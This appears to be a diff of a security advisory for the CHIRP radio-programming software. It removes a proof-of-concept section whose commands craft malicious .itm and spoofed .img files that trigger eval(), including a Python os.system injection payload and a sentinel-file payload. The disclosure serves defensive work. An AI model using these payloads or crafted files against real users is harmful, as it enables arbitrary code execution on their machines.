@@ -94,45 +94,6 @@ CHIRP only **writes** the magic bytes when saving as `.img` (chirp_common.py:165
 2. **File → Open** — `evil_chirp.img` appears in the **default** filter.
 3. Select it and click Open.
 
-No filter change required.
-
----
-
-## Proof of Concept Scripts
-
-### POC 1 — Direct `.itm` injection
-
-```bash
-# Write evil.itm (calc.exe payload)
-python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py
-
-# Custom payload
-python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py \
-    --payload "__import__('os').system('whoami > /tmp/out')"
-
-# Safe self-test: prove payload survives CSV parsing without calling eval()
-python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py --selftest
-```
-
-The `--selftest` mode replicates CHIRP's full CSV parse path and uses `compile()` to verify the payload is a valid Python expression — `eval()` is never called and no file is written.
-
-### POC 2 — Metadata-spoofed `.img`
-
-```bash
-# Write evil_chirp.img (calc.exe payload)
-python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py
-
-# Custom output path
-python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py \
-    --output radio_backup.img
-
-# Safe self-test: calls get_radio_by_image() + ITMRadio.load() against live
-# CHIRP source; verifies driver selection and eval() via sentinel file
-python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py --selftest
-```
-
-The `--selftest` mode for POC 2 uses a sentinel-file payload (`open(path,'w').write('pwned')`), calls `ITMRadio.load()` directly against the CHIRP source tree, and asserts the sentinel was created — proving end-to-end that the eval() fired without launching a GUI.
-
 ---
 
 ## Impact
